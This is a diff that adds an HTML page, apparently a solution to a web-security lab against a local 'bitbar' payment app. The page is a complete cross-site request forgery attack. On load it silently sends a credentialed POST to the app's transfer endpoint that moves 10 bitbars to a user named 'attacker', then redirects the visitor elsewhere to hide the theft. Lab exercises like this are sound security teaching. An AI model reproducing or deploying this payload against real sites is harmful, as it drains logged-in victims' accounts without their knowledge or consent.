@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>Stolen 10 bitbars</title>
+
+    <script>
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://127.0.0.1:3000/post_transfer", false);
+        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        xhr.withCredentials = true;
+        
+        try {
+            xhr.send("destination_username=attacker&quantity=10");
+        }
+        finally {
+            window.location.replace("https://www.baidu.com");
+        }
+
+    </script>
+</head>
+<body>
+    
+</body>
+</html>
